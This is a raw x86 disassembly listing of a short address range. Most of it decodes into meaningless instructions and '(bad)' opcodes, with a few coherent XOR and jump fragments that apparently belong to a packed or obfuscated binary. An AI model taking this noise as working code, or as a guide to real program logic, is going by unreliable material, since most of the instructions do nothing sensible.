  412f96:	xchg   bp,ax
  412f98:	int3   
  412f99:	sbb    cl,BYTE PTR [ebp-0x7e4c172e]
  412f9f:	fwait
  412fa0:	ret    0x2e33
  412fa3:	mov    ds:0xb1e3bce7,eax
  412fa8:	outs   dx,DWORD PTR ds:[esi]
  412fa9:	call   DWORD PTR [ebp-0x3df715df]
  412faf:	add    BYTE PTR [ecx+0x2beca51b],bh
  412fb5:	jns    0x413007
  412fb7:	pop    esi
  412fb8:	inc    esp
  412fb9:	push   ds
  412fba:	or     eax,0x7fe52038
  412fbf:	sbb    al,0xe3
  412fc1:	ficomp WORD PTR [esi+0x0]
  412fc4:	pop    ecx
  412fc5:	add    al,dh
  412fc7:	sub    eax,0x2c8e7d53
  412fcc:	loope  0x413032
  412fce:	push   cs
  412fcf:	in     al,dx
  412fd0:	jmp    0xe38c:0x2f43721a
  412fd7:	in     eax,dx
  412fd8:	push   0xffffff8f
  412fda:	mov    esi,0xa1969cda
  412fdf:	pop    edx
  412fe0:	stos   BYTE PTR es:[edi],al
  412fe1:	jp     0x41302b
  412fe3:	out    dx,eax
  412fe4:	push   cs
  412fe5:	addr16 jge 0x413065
  412fe8:	fsubr  QWORD PTR [esi-0x1987508b]
  412fee:	das    
  412fef:	jo     0x412fc5
  412ff1:	jg     0x412fad
  412ff3:	jns    0x41306d
  412ff5:	xor    al,0xd0
  412ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff8:	ret    0x7a7
  412ffb:	mov    al,BYTE PTR [ecx-0x2f1463e]
  413001:	clc    
  413002:	mov    esp,0x5ef6fa25
  413007:	rcr    edi,cl
  413009:	push   cs
  41300a:	test   BYTE PTR [eax+0x7c],bl
  41300d:	aaa    
  41300e:	pop    ss
  41300f:	pop    edx
  413010:	call   0x8da4:0xbf9d3a1e
  413017:	mov    esp,0xc4c094af
  41301c:	mov    BYTE PTR [ecx],cl
  41301e:	in     al,dx
  41301f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413020:	aaa    
  413021:	add    eax,DWORD PTR [eax]
  413023:	ror    BYTE PTR [edi],1
  413025:	pop    esp
  413026:	and    bl,BYTE PTR [esi]
  413028:	xor    DWORD PTR [edx+eax*4],eax
  41302b:	aaa    
  41302c:	popa   
  41302d:	and    ebx,DWORD PTR [ecx+0x6e]
  413030:	mov    ebp,0xd05f1e6b
  413035:	leave  
  413036:	scas   eax,DWORD PTR es:[edi]
  413037:	sub    BYTE PTR [ebx-0x7c],0x70
  41303b:	push   ebx
  41303c:	sub    eax,0xefad9065
  413041:	dec    ebp
  413042:	int3   
  413043:	shl    BYTE PTR ds:0xb5460e19,0x62
  41304a:	xchg   ebx,eax
  41304b:	mov    esp,0xe6d9285c
  413050:	loop   0x4130cb
  413052:	jg     0x413075
  413054:	push   ecx
  413055:	(bad)
  413059:	mov    BYTE PTR [ebx+0x507ff279],ch
  41305f:	xor    BYTE PTR [ecx-0x2d7e8542],al
  413065:	xor    BYTE PTR [edi-0x49549bd2],dh
  41306b:	fwait
  41306c:	xchg   esp,eax
  41306d:	fcmovne st,st(2)
  41306f:	fsub   DWORD PTR [ecx]
  413071:	ss adc dh,dh
  413074:	popa   
  413075:	push   ebx
  413076:	in     eax,0x35
  413078:	xor    ah,0xc
  41307b:	cld    
  41307c:	repz ror DWORD PTR [ebp+0x7a],1
  413080:	out    0x3d,eax
  413082:	mov    WORD PTR [edx+ebx*4+0x40],fs
  413086:	cmc    
  413087:	dec    eax
  413088:	outs   dx,BYTE PTR ds:[esi]
  413089:	fiadd  WORD PTR [eax]
  41308b:	or     BYTE PTR [edi-0x4],bh
  41308e:	pop    edx
  41308f:	xor    cl,BYTE PTR [edi+0x53]
  413092:	mov    ds:0x8a10fbad,al
  413097:	mov    eax,gs:0x56c32e3d
  41309d:	retf   0x5d67
  4130a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a1:	addr16 push ss
  4130a3:	sbb    eax,0x11e28967
  4130a8:	sub    ah,BYTE PTR [ecx+0x7]
  4130ab:	jbe    0x413067
  4130ad:	push   ebp
  4130ae:	push   ebp
  4130af:	mov    dh,0x8
  4130b1:	xchg   edx,eax
  4130b2:	retf   
  4130b3:	fst    DWORD PTR [edi]
  4130b5:	cmp    DWORD PTR [eax],ebp
  4130b7:	adc    al,0x98
  4130b9:	push   ebp
  4130ba:	out    0xe9,al
  4130bc:	shl    DWORD PTR [eax+ecx*2],1
  4130bf:	inc    ebx
  4130c0:	das    
  4130c1:	sub    ecx,DWORD PTR [eax+0x46]
  4130c4:	or     DWORD PTR [esp+ebp*2+0x4ecc9cc6],edi
  4130cb:	scas   al,BYTE PTR es:[edi]
  4130cc:	ja     0x4130b9
  4130ce:	fld    QWORD PTR [ebx+0x1b3dca68]
  4130d4:	out    dx,eax
  4130d5:	and    BYTE PTR [eax],ch
  4130d7:	mov    es,WORD PTR [ebx]
  4130d9:	ror    DWORD PTR [ebx-0x18],1
  4130dc:	out    dx,eax
  4130dd:	(bad)  
  4130de:	inc    eax
  4130df:	push   0x7d
  4130e1:	outs   dx,DWORD PTR ds:[esi]
  4130e2:	pop    esi
  4130e3:	adc    ch,bl
  4130e5:	dec    ebx
  4130e6:	jle    0x4130d6
  4130e8:	stc    
  4130e9:	cmc    
  4130ea:	pop    eax
  4130eb:	adc    BYTE PTR [ecx-0x5cd29426],ah
  4130f1:	adc    esp,ebx
  4130f3:	mov    WORD PTR ds:0x2ecdbbe9,ds
  4130f9:	xor    al,0x62
  4130fb:	cmp    BYTE PTR [eax],ch
  4130fd:	push   ebp
  4130fe:	mov    al,ds:0x9186b64e
  413103:	push   esi
  413104:	aas    
  413105:	fsub   QWORD PTR [eax+0x128ca3e2]
  41310b:	pusha  
  41310c:	xchg   DWORD PTR [eax-0x30b1264],ecx
  413112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413113:	popa   
  413114:	lods   al,BYTE PTR ds:[esi]
  413115:	cmc    
  413116:	ja     0x413149
  413118:	xchg   esp,eax
  413119:	jge    0x4130a8
  41311b:	hlt    
  41311c:	(bad)  
  41311d:	repnz xor BYTE PTR ds:[edx+0x6],dh
  413122:	clc    
  413123:	push   ds
  413124:	mov    al,0xbd
  413126:	(bad)  
  413127:	je     0x413199
  413129:	jbe    0x4130b4
  41312b:	fisubr DWORD PTR [esi]
  41312d:	add    eax,0x5f760492
  413132:	sahf   
  413133:	(bad)  
  413134:	aad    0xea
  413136:	xor    al,0x82
  413138:	rcl    BYTE PTR [edx+0xe],1
  41313b:	inc    edi
  41313c:	add    bl,bh
  41313e:	mov    esi,0xa531becb
  413143:	and    DWORD PTR [edi],esi
  413145:	cmp    eax,0x758969dd
  41314a:	fmul   DWORD PTR [ecx+0x7589d475]
  413150:	in     al,dx
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	dec    edi
  41317f:	fldcw  WORD PTR [edi]
  413181:	push   ebx
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x4131a7
  41318b:	inc    ebx
  41318c:	pop    ebx
  41318d:	xchg   esi,eax
  41318e:	lahf   
  41318f:	popf   
  413190:	es adc al,bl
  413193:	clc    
  413194:	sbb    DWORD PTR [eax+0x100e0416],0xf8d97696
  41319e:	or     dh,cl
  4131a0:	stos   BYTE PTR es:[edi],al
  4131a1:	bound  ecx,QWORD PTR [ecx]
  4131a3:	aad    0x5f
  4131a5:	js     0x41317b
  4131a7:	or     al,0x9e
  4131a9:	retf   0xa288
  4131ac:	xor    cl,al
  4131ae:	es mov ebp,0x6b95eee4
  4131b4:	push   edi
  4131b5:	mov    WORD PTR fs:[edx+0x3c800fb3],fs
  4131bc:	ret    0x8533
  4131bf:	push   ss
  4131c0:	aas    
  4131c1:	cmp    DWORD PTR [ecx+0x33],edx
  4131c4:	arpl   WORD PTR [ebp-0xc],bx
  4131c7:	daa    
  4131c8:	(bad)  
  4131c9:	out    dx,eax
  4131ca:	test   DWORD PTR [edx-0x64],edx
  4131cd:	mov    esp,0xcf3d93f3
  4131d2:	adc    ebx,DWORD PTR [esi+eiz*4-0x3afb4709]
  4131d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131da:	cmp    DWORD PTR [eax-0x11],edx
  4131dd:	jge    0x413251
  4131df:	into   
  4131e0:	mov    WORD PTR [esi-0x7b],es
  4131e3:	lods   al,BYTE PTR ds:[esi]
  4131e4:	(bad)  
  4131e5:	loope  0x41320c
  4131e7:	stos   BYTE PTR es:[edi],al
  4131e8:	fwait
  4131e9:	push   es
  4131ea:	jmp    0x4fe4:0x774cbe5f
  4131f1:	adc    eax,0x6441834
  4131f6:	pop    edx
  4131f7:	inc    eax
  4131f8:	ins    BYTE PTR es:[edi],dx
  4131f9:	test   ecx,ebp
  4131fb:	icebp  
  4131fc:	jmp    0x4131a1
  4131fe:	(bad)  
  4131ff:	cmp    DWORD PTR [esi-0x4],edi
  413202:	and    BYTE PTR [ebx],dh
  413204:	(bad)  
  413205:	stos   DWORD PTR es:[edi],eax
  413206:	clc    
  413207:	pop    edi
  413208:	shl    BYTE PTR [edx-0x5497d9cd],1
  41320e:	or     eax,0x32b4bc6
  413213:	sbb    esp,esp
  413215:	stos   DWORD PTR es:[edi],eax
  413216:	push   ds
  413217:	nop
  413218:	adc    DWORD PTR [eax],ebp
  41321a:	sar    esi,0xa2
  41321d:	iretw  
  41321f:	ficomp DWORD PTR [esi-0x2a286cb7]
  413225:	loope  0x41320c
  413227:	lods   al,BYTE PTR ds:[esi]
  413228:	or     ebp,DWORD PTR [ebx+0xca1b3ad]
  41322e:	xchg   esp,eax
  41322f:	repnz fs dec ebx
  413232:	xor    al,0x30
  413234:	xchg   ch,al
  413236:	fnsave [ecx+0x37]
  413239:	fnsave [ebp+0x69a8361]
  41323f:	out    0xf,al
  413241:	or     bh,bh
  413243:	inc    eax
  413244:	dec    esi
  413245:	jecxz  0x4132c4
  413247:	adc    BYTE PTR [ecx],dh
  413249:	daa    
  41324a:	leave  
  41324b:	in     eax,0x4f
  41324d:	jo     0x413270
  41324f:	inc    edi
  413250:	or     al,0xd6
  413252:	pop    esp
  413253:	in     eax,0xf2
  413255:	inc    eax
  413256:	loop   0x4131f1
  413258:	pop    esi
  413259:	imul   ebp,edi,0x6457559
  41325f:	fdivr  QWORD PTR [esi+0x5ecae1d0]
  413266:	sti    
  413267:	dec    eax
  413268:	dec    esp
  413269:	xor    eax,0x88462e4a
  41326e:	ds std 
  413270:	jecxz  0x413223
  413272:	addr16 loope 0x4132da
  413275:	mov    dl,0x62
  413277:	rcr    BYTE PTR [eax+eax*1+0x32],1
  41327b:	inc    esi
  41327c:	imul   ecx,DWORD PTR [edx],0xffffff85
  41327f:	adc    ebp,eax
  413281:	jae    0x413297
  413283:	lahf   
  413284:	fisttp WORD PTR [edi+ebp*2-0x76197bec]
  41328b:	adc    ah,BYTE PTR [esi]
  41328d:	fadd   DWORD PTR [ecx+0x3c]
  413290:	inc    ebx
  413291:	aam    0x83
  413293:	js     0x4132f2
  413295:	mov    cl,0x5a
  413297:	lock add edx,DWORD PTR ds:[eax+0x10156967]
  41329f:	dec    esi
  4132a0:	sbb    ebx,DWORD PTR [ecx+eiz*8-0x2da9bc96]
  4132a7:	test   eax,0x2bc11942
  4132ac:	cmp    al,0x7d
  4132ae:	add    BYTE PTR [edi],0x94
  4132b1:	and    eax,0x8ba4ea0d
  4132b6:	in     eax,0xad
  4132b8:	pop    es
  4132b9:	xchg   ecx,eax
  4132ba:	xor    al,BYTE PTR [esi-0x50]
  4132bd:	xor    dh,BYTE PTR [ebx+0x63f652c0]
  4132c3:	xor    al,BYTE PTR [edx+0x6c]
  4132c6:	fcom   DWORD PTR [edx-0xd]
  4132c9:	lock sbb edi,DWORD PTR [edi-0x23ce4510]
  4132d0:	ds mov cl,0xd7
  4132d3:	std    
  4132d4:	push   edi
  4132d5:	cmp    al,0xa4
  4132d7:	sbb    esp,DWORD PTR [edi+eax*4-0x2a]
  4132db:	cdq    
  4132dc:	dec    edx
  4132dd:	test   BYTE PTR [ecx],dh
  4132df:	push   cs
  4132e0:	push   0x695b529d
  4132e5:	mov    eax,0x158d3199
  4132ea:	add    al,0xa8
  4132ec:	pop    ecx
  4132ed:	xchg   BYTE PTR [edi],bl
  4132ef:	add    DWORD PTR [ebx],ebp
  4132f1:	pushf  
  4132f2:	push   edi
  4132f3:	sub    eax,0x67b2148b
  4132f8:	jnp    0x41331d
  4132fa:	loope  0x4132a5
  4132fc:	inc    ebp
  4132fd:	fstp   QWORD PTR [esi]
  4132ff:	mov    es:0xf8f14628,al
  413305:	or     al,0x33
  413307:	fwait
  413308:	ds stc 
  41330a:	and    al,cl
  41330c:	mov    cl,0x69
  41330e:	xchg   esi,eax
  41330f:	scas   eax,DWORD PTR es:[edi]
  413310:	lods   eax,DWORD PTR ds:[esi]
  413311:	hlt    
  413312:	xchg   DWORD PTR [ebx+esi*2-0x1efaf15a],esi
  413319:	inc    ebp
  41331a:	xchg   edi,esp
  41331c:	or     BYTE PTR [ebx+0x20],0x38
  413320:	test   BYTE PTR [ebx-0x7614430f],0xdd
  413327:	push   edx
  413328:	push   sp
  41332a:	rol    DWORD PTR [esi-0x76f651ae],cl
  413330:	mov    cl,0xa2
  413332:	push   esp
  413333:	jecxz  0x41330a
  413335:	xchg   ebx,eax
  413336:	test   BYTE PTR [ebp-0x7c],0xa3
  41333a:	scas   al,BYTE PTR es:[edi]
  41333b:	jnp    0x4132d9
  41333d:	retf   
  41333e:	stos   BYTE PTR es:[edi],al
  41333f:	mov    WORD PTR [ebx-0xb],?
  413342:	lods   al,BYTE PTR ds:[esi]
  413343:	ror    DWORD PTR [esi-0x28],cl
  413346:	stos   BYTE PTR es:[edi],al
  413347:	shr    DWORD PTR [edx+ecx*1-0x3b89a35b],1
  41334e:	dec    edx
  41334f:	in     eax,dx
  413350:	jl     0x413329
  413352:	test   dl,dl
  413354:	xchg   ecx,eax
  413355:	das    
  413356:	adc    BYTE PTR [eax],bl
  413358:	clc    
  413359:	sbb    BYTE PTR ds:[ebx-0x97430ec],0xb0
  413361:	sar    BYTE PTR [ebx],cl
  413363:	fcomp  DWORD PTR [esi+0x1e]
  413366:	adc    BYTE PTR [ebp+0x1eda0237],0x13
  41336d:	lods   eax,DWORD PTR ds:[esi]
  41336e:	(bad)  
  41336f:	fcomp  DWORD PTR [edi-0x2f]
  413372:	pop    ss
  413373:	dec    eax
  413374:	mov    fs,WORD PTR [ebp+eiz*8-0x70]
  413378:	pop    eax
  413379:	add    eax,0x4c8606f9
  41337e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337f:	and    ch,BYTE PTR [ebx-0x484cdfc7]
  413385:	fisttp QWORD PTR [ebx+0x22da042c]
  41338b:	push   ss
  41338c:	sub    DWORD PTR [ecx-0x72],ebx
  41338f:	out    dx,al
  413390:	mov    ah,dl
  413392:	in     eax,dx
  413393:	ja     0x413322
  413395:	les    esp,FWORD PTR [ebx]
  413397:	fwait
  413398:	ret    
  413399:	ror    BYTE PTR [edx-0xd1fdc1c],cl
  41339f:	mov    ebx,0x6188cfb7
  4133a4:	mov    WORD PTR [esi+0x964df72],?
  4133aa:	test   bl,cl
  4133ac:	xor    BYTE PTR [ebx-0x3c],dh
  4133af:	fwait
  4133b0:	popf   
  4133b1:	int    0xf3
  4133b3:	test   DWORD PTR [edi],eax
  4133b5:	dec    edi
  4133b6:	mov    ebp,0x45398a5
  4133bb:	inc    edx
  4133bc:	sti    
  4133bd:	mov    ecx,0xd0289f8
  4133c2:	(bad)  
  4133c3:	pusha  
  4133c4:	mov    edi,0x4cc8c92d
  4133c9:	loop   0x413394
  4133cb:	dec    esi
  4133cc:	mov    esp,DWORD PTR ds:0x9a0f5b0b
  4133d2:	cld    
  4133d3:	cmp    al,0xf2
  4133d5:	fdiv   st,st(1)
  4133d7:	test   BYTE PTR [edi],0xb6
  4133da:	push   cs
  4133db:	test   DWORD PTR [edi+0x8],ebp
  4133de:	ror    BYTE PTR [eax-0x221fc487],cl
  4133e4:	pop    ss
  4133e5:	icebp  
  4133e6:	push   esi
  4133e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e9:	rcl    BYTE PTR [eax+0x5],1
  4133ec:	(bad)  
  4133ed:	outs   dx,DWORD PTR ds:[esi]
  4133ee:	call   0x3340f75
  4133f3:	push   edx
  4133f4:	int    0x5c
  4133f6:	xor    BYTE PTR [edx],0xfd
  4133f9:	fsubr  st(4),st
  4133fb:	lea    edx,[edx]
  4133fd:	pusha  
  4133fe:	pusha  
  4133ff:	(bad)
  413402:	and    ah,BYTE PTR [eax+0x7d]
  413405:	sub    DWORD PTR [edi],eax
  413407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413408:	jp     0x413473
  41340a:	jge    0x41348a
  41340c:	jl     0x41344b
  41340e:	and    DWORD PTR [esi+eiz*2-0x6d417a7],eax
  413415:	mov    bl,0x66
  413417:	sub    bl,BYTE PTR [ebx-0x7a]
  41341a:	aam    0xc9
  41341c:	scas   al,BYTE PTR es:[edi]
  41341d:	sub    eax,0x7b174725
  413422:	add    BYTE PTR [ecx-0x717589af],0xcb
  413429:	aad    0x4f
  41342b:	xchg   edx,eax
  41342c:	icebp  
  41342d:	mov    BYTE PTR [esi+0x69f80c86],cl
  413433:	mov    BYTE PTR [edx+0x1a16c9a2],cl
  413439:	std    
  41343a:	or     dh,ah
  41343c:	or     dl,BYTE PTR [esi+0x23cec629]
  413442:	sbb    DWORD PTR [edi+0x1d01867a],edx
  413448:	(bad)  
  413449:	xlat   BYTE PTR ds:[ebx]
  41344a:	jg     0x41345b
  41344c:	retf   0x8ed1
  41344f:	fidivr DWORD PTR [ebx+0x3]
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x1595f90f,al
  413492:	inc    esi
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xd970707e
  41349c:	sub    eax,0x13ec91f1
  4134a1:	test   BYTE PTR [ebp-0x28644163],0xf
  4134a8:	cmp    eax,0xfdfc68f5
  4134ad:	stos   BYTE PTR es:[edi],al
  4134ae:	fistp  QWORD PTR [ebx]
  4134b0:	xchg   esp,eax
  4134b1:	lds    edi,FWORD PTR [edx]
  4134b3:	pushf  
  4134b4:	cmc    
  4134b5:	push   es
  4134b6:	cmp    BYTE PTR [edi],bh
  4134b8:	xchg   esp,eax
  4134b9:	out    0x49,al
  4134bb:	cmp    al,0x12
  4134bd:	loope  0x413502
  4134bf:	in     eax,dx
  4134c0:	mov    ecx,0xa5e5d545
  4134c5:	call   FWORD PTR [ebx-0xbb8dea6]
  4134cb:	in     al,0x20
  4134cd:	mov    ebx,0x9bcda472
  4134d2:	call   0x7222:0xdae7a63
  4134d9:	cmp    eax,0x17b70bb9
  4134de:	or     bh,dl
  4134e0:	xor    BYTE PTR [ecx-0x62],al
  4134e3:	mov    dl,0x37
  4134e5:	sbb    BYTE PTR [edx+0x7f11605c],dh
  4134eb:	pop    ecx
  4134ec:	pop    edx
  4134ed:	xchg   ebp,eax
  4134ee:	jg     0x41353f
  4134f0:	mov    ebx,0xd2afd7a7
  4134f5:	mov    DWORD PTR [edx],esp
  4134f7:	daa    
  4134f8:	jecxz  0x4134f9
  4134fa:	test   eax,0x55236167
  4134ff:	push   0x8b1fc131
  413504:	pushf  
  413505:	jb     0x41352c
  413507:	xchg   DWORD PTR [edi],edi
  413509:	jbe    0x413533
  41350b:	cld    
  41350c:	add    DWORD PTR [edx-0x6a],edx
  41350f:	dec    edx
  413510:	cwde   
  413511:	jb     0x4134a4
  413513:	hlt    
  413514:	jae    0x41349f
  413516:	loope  0x4134fa
  413518:	jne    0x41353e
  41351a:	out    dx,al
  41351b:	mov    ah,BYTE PTR [ebp+0x7248e0c2]
  413521:	sbb    al,0x89
  413523:	mov    ah,BYTE PTR [edi+0x52d41928]
  413529:	int    0xe3
  41352b:	push   edx
  41352c:	xor    BYTE PTR [edx-0x5dd11be9],ch
  413532:	sub    eax,0xd934221e
  413537:	loop   0x413575
  413539:	pushf  
  41353a:	lock xor DWORD PTR ds:0x31986fba,ecx
  413541:	das    
  413542:	arpl   WORD PTR ds:0x56367eda,ax
  413548:	mov    esp,edi
  41354a:	outs   dx,DWORD PTR ds:[esi]
  41354b:	lea    eax,[ebx]
  41354d:	inc    esi
  41354e:	fs mov bl,0xd5
  413551:	sub    eax,DWORD PTR [ecx]
  413553:	call   0xea88:0x1d7a3369
  41355a:	xchg   BYTE PTR [ecx+0x53894110],ah
  413560:	in     eax,dx
  413561:	cld    
  413562:	push   es
  413563:	cmp    ebp,DWORD PTR [eax]
  413565:	fst    st(0)
  413567:	cmp    DWORD PTR [edi+0x177f6a14],esi
  41356d:	adc    edi,esi
  41356f:	sar    BYTE PTR [edi-0x72],0xb5
  413573:	jae    0x413599
  413575:	sub    cl,BYTE PTR [edi+0xbfae590]
  41357b:	xor    al,0x47
  41357d:	scas   al,BYTE PTR es:[edi]
  41357e:	call   0x1632ea18
  413583:	call   0x25546296
  413588:	sbb    esp,DWORD PTR [edi+0x5a]
  41358b:	fiadd  WORD PTR [ecx+0x11b73fad]
  413591:	mov    dl,0x60
  413593:	pop    ebx
  413594:	out    dx,eax
  413595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413596:	push   0x2d
  413598:	out    dx,eax
  413599:	stos   DWORD PTR es:[edi],eax
  41359a:	xchg   edx,eax
  41359b:	icebp  
  41359c:	popa   
  41359d:	xor    ah,BYTE PTR [edx+0xf]
  4135a0:	adc    BYTE PTR [eax],dh
  4135a2:	push   es
  4135a3:	cmc    
  4135a4:	mov    cl,BYTE PTR [ebx]
  4135a6:	xor    DWORD PTR gs:[edx+0x74],edi
  4135aa:	xlat   BYTE PTR ds:[ebx]
  4135ab:	test   BYTE PTR [edx+0x0],al
  4135ae:	sbb    DWORD PTR [edi+0xe346f7e],edx
  4135b4:	mov    edi,0x9e10e99
  4135b9:	clc    
  4135ba:	scas   eax,DWORD PTR es:[edi]
  4135bb:	clc    
  4135bc:	test   al,0x62
  4135be:	dec    edx
  4135bf:	aam    0x39
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	shl    ch,1
  4135c4:	add    bh,BYTE PTR [ebp-0x5e871771]
  4135ca:	push   edi
  4135cb:	rol    BYTE PTR ds:0xfc17b515,1
  4135d1:	add    edx,edx
  4135d3:	sbb    eax,0xca01b58
  4135d8:	out    0xfa,eax
  4135da:	push   edi
  4135db:	jg     0x4135ea
  4135dd:	sub    DWORD PTR [edx+0x4876ec1c],0xa9625f93
  4135e7:	ror    DWORD PTR [edi+0x1a1b7ab],1
  4135ed:	mov    eax,ds:0xac1d66fb
  4135f2:	and    BYTE PTR [eax+0x3f6df205],0x80
  4135f9:	(bad)  
  4135fa:	scas   eax,DWORD PTR es:[edi]
  4135fb:	lods   al,BYTE PTR ds:[esi]
  4135fc:	mov    ecx,0x66fdafc0
  413601:	mov    ch,0x77
  413603:	dec    ebp
  413604:	push   esi
  413605:	out    0xb5,al
  413607:	jne    0x4135ee
  413609:	std    
  41360a:	enter  0xa379,0xa2
  41360e:	mov    esp,0x6944d5ed
  413613:	das    
  413614:	cld    
  413615:	into   
  413616:	gs mov bl,0x1c
  413619:	xchg   esi,eax
  41361a:	and    esi,ebp
  41361c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41361d:	mov    dh,0xa0
  41361f:	loopne 0x413610
  413621:	push   ebx
  413622:	js     0x41366c
  413624:	(bad)  
  413625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413626:	addr16 jp 0x41369c
  413629:	data16 mov al,ds:0x1e5671d0
  41362f:	dec    edi
  413630:	add    eax,0x601e6c35
  413635:	mov    DWORD PTR [ebx],eax
  413637:	ret    
  413638:	ds ror edi,cl
  41363b:	dec    ebx
  41363c:	adc    al,0x27
  41363e:	cmp    eax,DWORD PTR [eax-0x3b]
  413641:	shl    DWORD PTR [ebx+0x8],cl
  413644:	sar    bh,cl
  413646:	mov    ?,WORD PTR [ebx-0x16]
  413649:	push   edx
  41364a:	pop    ebp
  41364b:	add    eax,0x526ad177
  413650:	jno    0x4136d0
  413652:	jnp    0x413645
  413654:	mov    fs,WORD PTR [edi+0x28]
  413657:	jns    0x413605
  413659:	adc    edi,edi
  41365b:	in     al,0xc7
  41365d:	lahf   
  41365e:	cmp    edx,DWORD PTR ds:0x1c22c04
  413664:	leave  
  413665:	rcr    DWORD PTR [edi-0x226fd85],1
  41366b:	loopne 0x41362d
  41366d:	mov    esp,0x296e3996
  413672:	mov    ebp,0x46a97f4a
  413677:	aam    0x4a
  413679:	addr16 mov bl,0xa2
  41367c:	push   0xc60f68b2
  413681:	data16 rcr BYTE PTR [esi-0x2afd46dc],cl
  413688:	mov    ds:0xcd2d5975,al
  41368d:	fmul   st,st(0)
  41368f:	out    0xc6,eax
  413691:	sub    cl,BYTE PTR [ebp+esi*4-0x1c]
  413695:	mov    eax,ds:0x6f9d29eb
  41369a:	aaa    
  41369b:	sbb    BYTE PTR [edx+0x20be011],dl
  4136a1:	data16 std 
  4136a3:	scas   al,BYTE PTR es:[edi]
  4136a4:	test   DWORD PTR [ebp+0x44e779a1],edi
  4136aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136ab:	sub    BYTE PTR [ebx+0x25],0x5b
  4136af:	pop    ss
  4136b0:	mov    ebx,0xa0864d3a
  4136b5:	pop    ss
  4136b6:	sbb    al,0x1b
  4136b8:	mov    ebx,0x9e659989
  4136bd:	and    DWORD PTR [eax],edx
  4136bf:	daa    
  4136c0:	adc    ch,dh
  4136c2:	loop   0x41367a
  4136c4:	inc    edi
  4136c5:	inc    ecx
  4136c6:	mov    eax,0x46a5e8a8
  4136cc:	and    BYTE PTR [edi-0x68],ah
  4136cf:	dec    esi
  4136d0:	mov    ah,0x1f
  4136d2:	mov    eax,0xe687a9e5
  4136d7:	fs mov dl,0xb0
  4136da:	or     eax,0x9ff3bba8
  4136df:	dec    ecx
  4136e0:	pop    esi
  4136e1:	lock xchg ebx,eax
  4136e3:	pop    ebp
  4136e4:	sub    eax,0xff52f74e
  4136e9:	mov    esi,0x64651716
  4136ee:	and    BYTE PTR [eax-0x50739bd9],dl
  4136f4:	mov    dl,BYTE PTR [esi-0x1b]
  4136f7:	xor    eax,0x6d291141
  4136fc:	inc    eax
  4136fd:	mov    ds:0xaefe90b5,al
  413702:	scas   eax,DWORD PTR es:[edi]
  413703:	leave  
  413704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413705:	ins    DWORD PTR es:[edi],dx
  413706:	cmp    eax,0x177161e8
  41370b:	xlat   BYTE PTR ds:[ebx]
  41370c:	fcmovne st,st(1)
  41370e:	retf   0xe613
  413711:	pop    ebp
  413712:	xchg   ecx,eax
  413713:	adc    ecx,ebp
  413715:	jecxz  0x4136ab
  413717:	imul   esi,DWORD PTR [ebp+0x2c6695f7],0x9638e30a
  413721:	sbb    BYTE PTR ds:0x3182524d,0x8c
  413728:	and    edx,DWORD PTR [ebp+ebp*4+0x52]
  41372c:	xlat   BYTE PTR ds:[ebx]
  41372d:	adc    DWORD PTR [ecx],0x2b
  413730:	mov    ebp,0xc9f7223e
  413735:	dec    ecx
  413736:	push   ss
  413737:	xchg   ecx,eax
  413738:	jno    0x413719
  41373a:	dec    ebx
  41373b:	sti    
  41373c:	outs   dx,BYTE PTR ds:[esi]
  41373d:	(bad)  
  41373e:	mov    eax,0x9cc9d511
  413743:	xor    edx,DWORD PTR [edx]
  413745:	popa   
  413746:	les    ecx,FWORD PTR [ecx]
  413748:	(bad)  
  413749:	lods   al,BYTE PTR ds:[esi]
  41374a:	ficomp DWORD PTR [eax+ebx*8]
  41374d:	cwde   
  41374e:	push   esi
  41374f:	iret   
  413750:	mov    cl,0xcb
  413752:	in     eax,dx
  413753:	outs   dx,DWORD PTR ds:[esi]
  413754:	test   eax,0xf1022697
  413759:	ins    BYTE PTR es:[edi],dx
  41375a:	sub    al,0x87
  41375c:	test   eax,0xa95a231d
  413761:	lds    edi,FWORD PTR [ebx]
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	cmc    
  41377f:	fist   WORD PTR [ebp-0x35]
